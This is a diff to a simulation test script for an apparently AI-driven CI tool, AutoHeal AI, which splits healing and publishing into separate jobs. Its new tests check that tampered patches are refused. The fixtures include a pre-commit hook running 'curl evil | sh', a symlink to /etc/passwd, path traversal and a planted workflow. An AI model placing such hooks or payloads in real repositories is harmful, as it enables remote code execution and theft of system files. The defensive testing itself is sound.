@@ -15,8 +15,8 @@
  *           → BLOCKED_CHEATING, files unchanged, exit code 3; then gives up
  *           on the profile test → APP_BUG
  *   comment comment mode: proposes fixes but leaves the tree clean
- *   action  runs every step of action.yml (heal, fix PR, issues) with real
- *           git, a local bare remote and a fake gh; then re-runs the PR step
+ *   action  runs the heal action, then the publish action in a fresh clone (fix PR,
+ *           issues), checks re-runs, comment mode and refuses tampered patches
  *   dashboard  uploads the "ai" results to a local dashboard and reads them back
  *
  * Usage: npm run simulate [-- <scenario> ...]
@@ -250,9 +250,30 @@ const scenarios = {
     const run = runAction({ actionDir: repo, projectDir: dir, inputs: { 'max-failures': '4' }, github, env, skip: ['Install AutoHeal AI'] });
     const steps = Object.fromEntries(run.log.map((s) => [s.step, s]));
     if (!run.ok || process.env.SIM_VERBOSE) for (const s of run.log) console.log(`    [${s.step}] ${s.skipped ? 'skipped' : `exit ${s.code}`}\n${s.stderr ?? ''}${s.stdout ?? ''}`);
-    check(run.ok, 'every action step succeeded');
+    check(run.ok, 'heal job: every step succeeded');
     check(run.ctx.steps.heal?.outcome === 'fixed' && run.ctx.steps.heal?.fixed === '2', `heal outputs: outcome=${run.ctx.steps.heal?.outcome} fixed=${run.ctx.steps.heal?.fixed}`);
-    check(run.ctx.steps.pr?.['pr-url'] === 'https://github.com/acme/shop/pull/101', 'fix PR opened');
+    check(readFileSync(ghLog, 'utf8') === '', 'heal job made no GitHub calls (read-only)');
+    const result = run.ctx.steps.package?.['result-dir'];
+    check(result && existsSync(path.join(result, 'patch.diff')) && existsSync(path.join(result, 'meta.json')), 'heal job packed a patch for the publish job');
+    check(steps['Upload the result for the publish job']?.uses?.startsWith('actions/upload-artifact@'), 'result handed over as an artifact');
+    const changedList = readFileSync(path.join(result, 'changed-files.txt'), 'utf8').trim().split('\n');
+    check(changedList.includes('tests/login.spec.ts') && changedList.includes('pages/profile.ts'), `changed files listed (${changedList.length})`);
+
+    // The publish job: a fresh checkout of the failed commit, no npm install.
+    const publishDir = path.join(workRoot, 'action-publish');
+    const freshClone = () => {
+      rmSync(publishDir, { recursive: true, force: true });
+      execFileSync('git', ['clone', '-q', '-b', 'main', remote, publishDir], { stdio: 'pipe' });
+      writeFileSync(path.join(publishDir, '.git', 'info', 'exclude'), '.runner-temp/\n');
+    };
+    const publish = (inputs, resultDir = result) => {
+      freshClone();
+      return runAction({ actionDir: path.join(repo, 'publish'), projectDir: publishDir, inputs: { 'result-dir': resultDir, 'base-branch': 'main', 'run-id': '4242', commit: 'a'.repeat(40), blocked: run.ctx.steps.heal.blocked, ...inputs }, github, env });
+    };
+    const pub = publish({});
+    if (!pub.ok || process.env.SIM_VERBOSE) for (const s of pub.log) console.log(`    [publish ${s.step}] exit ${s.code}\n${s.stderr ?? ''}${s.stdout ?? ''}`);
+    check(pub.ok, 'publish job succeeded');
+    check(pub.ctx.steps.publish?.['pr-url'] === 'https://github.com/acme/shop/pull/101', 'fix PR opened');
     const calls = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
     const create = calls.find((c) => c[0] === 'pr' && c[1] === 'create');
     check(create?.includes('--draft') && create[create.indexOf('--base') + 1] === 'main' && create[create.indexOf('--head') + 1] === 'autoheal/4242', 'draft PR from autoheal/4242 into main');
@@ -266,22 +287,54 @@ const scenarios = {
       JSON.stringify(pushedCode) === JSON.stringify(['pages/profile.ts', 'playwright-quarantine.json', 'tests/login.spec.ts']) && pushedFiles.length === 5,
       `only healed files and their 2 memory entries committed (${pushedFiles.join(', ')})`,
     );
+    const healedSpec = execFileSync('git', ['--git-dir', remote, 'show', 'autoheal/4242:tests/login.spec.ts'], { encoding: 'utf8' });
+    check(healedSpec === file(dir, 'tests/login.spec.ts'), 'pushed spec matches what the heal job verified');
     const mainHead = execFileSync('git', ['--git-dir', remote, 'log', '-1', '--format=%s', 'main'], { encoding: 'utf8' }).trim();
     check(mainHead === 'dummy shop', 'base branch untouched');
-    check(steps['Post the report (comment mode)']?.skipped && steps['Send results to your dashboard']?.skipped && steps['Fail when a fix was blocked']?.skipped, 'comment, dashboard and blocked steps skipped');
-    const issues = JSON.parse(readFileSync(run.ctx.steps.heal['issues-file'], 'utf8'));
-    check(issues[0]?.url?.startsWith('https://github.com/acme/shop/issues/'), 'issue URL written back for the dashboard');
 
-    // Same run healed again (a re-run of the job): the PR is updated, not duplicated.
-    const prStep = { ...run.ctx };
-    writeFileSync(path.join(dir, 'tests/login.spec.ts'), `${file(dir, 'tests/login.spec.ts')}\n`); // the re-run produced a slightly different fix
-    const again = runAction({ actionDir: repo, projectDir: dir, inputs: {}, github, env, skip: ['Install AutoHeal AI', 'Heal', 'Open issues for app bugs'], seed: prStep.steps });
+    // Same run published again (a re-run): the PR is updated, not duplicated.
+    const again = publish({});
     const calls2 = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
     check(again.ok && calls2.filter((c) => c[0] === 'pr' && c[1] === 'create').length === 1 && calls2.some((c) => c[0] === 'pr' && c[1] === 'edit'), 're-run updates the existing PR');
 
     // A base that is itself an AutoHeal branch is refused (loop guard).
-    const loop = runAction({ actionDir: repo, projectDir: dir, inputs: { 'base-branch': 'autoheal/1' }, github, env, skip: ['Install AutoHeal AI', 'Heal', 'Open issues for app bugs'], seed: prStep.steps });
-    check(loop.ok && /Refusing/.test(loop.log.find((s) => s.step === 'Open or update the fix pull request')?.stdout ?? ''), 'PR against an autoheal/ branch refused');
+    const loop = publish({ 'base-branch': 'autoheal/1' });
+    check(loop.ok && /Refusing/.test(loop.log[0]?.stdout ?? ''), 'PR against an autoheal/ branch refused');
+
+    // Comment mode pushes nothing and comments on the commit.
+    const before = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).length;
+    const comment = publish({ mode: 'comment' });
+    const calls3 = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)).slice(before);
+    check(comment.ok && calls3.length === 1 && calls3[0][0] === 'api' && /commits\/a{40}\/comments/.test(calls3[0][1]), 'comment mode only posts a comment');
+
+    // A tampered result is refused before anything is applied or pushed.
+    const evil = (name, patch) => {
+      const d = path.join(workRoot, `action-evil-${name}`);
+      rmSync(d, { recursive: true, force: true });
+      cpSync(result, d, { recursive: true });
+      writeFileSync(path.join(d, 'patch.diff'), patch);
+      writeFileSync(path.join(d, 'changed-files.txt'), '');
+      rmSync(path.join(d, 'changed-files.txt'));
+      const branchesBefore = execFileSync('git', ['--git-dir', remote, 'branch', '--list', 'autoheal/666'], { encoding: 'utf8' });
+      const res = publish({ 'run-id': '666' }, d);
+      const branchesAfter = execFileSync('git', ['--git-dir', remote, 'branch', '--list', 'autoheal/666'], { encoding: 'utf8' });
+      return { ok: res.ok, out: res.log[0]?.stdout ?? '', pushed: branchesAfter !== branchesBefore };
+    };
+    const newFile = (p, body) => `diff --git a/${p} b/${p}\nnew file mode 100644\nindex 0000000..1111111\n--- /dev/null\n+++ b/${p}\n@@ -0,0 +1 @@\n+${body}\n`;
+    const cases = {
+      workflow: newFile('.github/workflows/pwn.yml', 'on: push'),
+      hook: newFile('.git/hooks/pre-commit', 'curl evil | sh'),
+      traversal: newFile('tests/../../etc/x.ts', 'x'),
+      newcode: newFile('tests/evil.spec.ts', 'require("child_process")'),
+      config: `diff --git a/playwright.config.ts b/playwright.config.ts\nindex 1111111..2222222 100644\n--- a/playwright.config.ts\n+++ b/playwright.config.ts\n@@ -1 +1 @@\n-x\n+y\n`,
+      symlink: `diff --git a/tests/link.ts b/tests/link.ts\nnew file mode 120000\nindex 0000000..1111111\n--- /dev/null\n+++ b/tests/link.ts\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\n`,
+      rename: `diff --git a/tests/login.spec.ts b/tests/x.spec.ts\nsimilarity index 100%\nrename from tests/login.spec.ts\nrename to tests/x.spec.ts\n`,
+      mode: `diff --git a/tests/login.spec.ts b/tests/login.spec.ts\nold mode 100644\nnew mode 100755\n`,
+    };
+    for (const [name, patch] of Object.entries(cases)) {
+      const r = evil(name, patch);
+      check(!r.ok && !r.pushed && /publish refused/.test(r.out), `tampered patch refused: ${name}`);
+    }
   },
 
   async dashboard(aiResult) {
